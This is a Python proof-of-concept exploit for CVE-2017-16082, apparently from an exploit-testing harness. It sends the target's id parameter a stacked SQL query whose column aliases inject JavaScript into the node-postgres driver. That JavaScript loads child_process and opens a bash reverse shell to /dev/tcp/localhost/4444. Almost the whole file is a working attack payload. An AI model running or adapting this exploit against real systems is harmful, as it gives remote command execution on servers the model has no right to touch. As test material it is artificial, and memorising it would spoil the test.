#!/usr/bin/env python3
"""Trigger CVE-2017-16082 through the application's id query parameter."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request


COLUMN_ALIASES = (
    "']=0;require=process.mainModule.constructor._load;/*",
    "*/p=require(`child_process`);/*",
    "*/p.exec(`bash -c 'bash -i >& /dev/tcp/localhost/`+/*",
    "*/`4444 0>&1'`)//",
)


def build_query() -> str:
    columns = ", ".join(
        f'{index} AS "{alias}"'
        for index, alias in enumerate(COLUMN_ALIASES, 1)
    )
    return f"1;SELECT {columns};--"


def trigger(target_url: str) -> int:
    query = urllib.parse.urlencode({"id": build_query()})
    url = f"{target_url.rstrip('/')}?{query}"
    try:
        with urllib.request.urlopen(url, timeout=20) as response:
            response.read()
            return response.status
    except urllib.error.HTTPError as error:
        error.read()
        return error.code


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    time.sleep(2)
    status = trigger(target_url)
    if status != 200:
        raise RuntimeError(f"Unexpected application response: {status}")
    time.sleep(3)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
